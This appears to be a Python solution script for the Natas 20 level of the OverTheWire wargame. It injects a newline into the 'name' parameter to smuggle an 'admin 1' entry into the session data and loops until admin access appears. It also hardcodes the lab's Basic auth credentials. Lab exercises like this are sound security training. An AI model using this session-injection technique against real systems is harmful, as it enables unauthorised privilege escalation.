import requests

base_url ="http://natas20.natas.labs.overthewire.org/index.php?debug"
auth_headers = {'Authorization': 'Basic bmF0YXMyMDplb2ZtM1dzc2h4YzVid3RWbkV1R0lscjdpdmI5S0FCRg=='} 

i = 0

tried = []
while True:
    res = requests.get(base_url+"&name=admin\nadmin 1", headers=auth_headers, cookies={'PHPSESSID': ''} )

    lines = res.text.splitlines()
    #13
    for line in lines:
        if("DEBUG" in line):

            print(line.replace('<br>', '\n'))
    if("regular" not in res.text):
        print(res.text)
        break
    else:
        i += 1
        try:
            print("Attempt:", i)
        except:
            pass


